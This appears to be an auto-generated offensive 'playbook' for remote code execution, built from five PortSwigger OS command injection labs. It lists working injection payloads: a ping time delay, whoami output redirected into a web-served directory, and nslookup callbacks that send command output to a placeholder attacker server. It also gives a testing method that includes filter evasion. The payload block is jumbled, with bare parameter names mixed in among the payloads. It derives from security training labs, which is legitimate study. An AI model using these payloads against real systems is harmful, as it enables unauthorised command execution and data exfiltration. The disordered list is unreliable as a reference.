## RCE Playbook
*Synthesized from 5 PortSwigger labs*

### Overview
This playbook covers 5 known attack techniques for rce.

### Attack Techniques

**Blind Techniques:**
- Blind OS command injection with out-of-band interaction
- Blind OS command injection with out-of-band data exfiltration
- Blind OS command injection with output redirection
- Blind OS command injection with time delays

**General:**
- OS command injection, simple case

### Key Payloads
```
email
filename
email=x||ping+-c+10+127.0.0.1||
filename=output.txt
storeID
email=||whoami>/var/www/images/output.txt||
whoami
email=||nslookup+`whoami`.[CALLBACK_SERVER]||
/var/www/images/
email=x||nslookup+x.[CALLBACK_SERVER]||
1|whoami
```

### Indicators of Success
- Unexpected data in response
- Error messages revealing internal info
- Behavior change confirming injection
- Out-of-band callback received
- Access to unauthorized resources

### Testing Methodology
1. **Identify injection points** — forms, parameters, headers, cookies
2. **Test basic payloads** — start simple, escalate complexity
3. **Observe responses** — errors, timing, content changes
4. **Try bypasses** — encoding, alternative syntax, filter evasion
5. **Confirm impact** — data extraction, privilege escalation, RCE

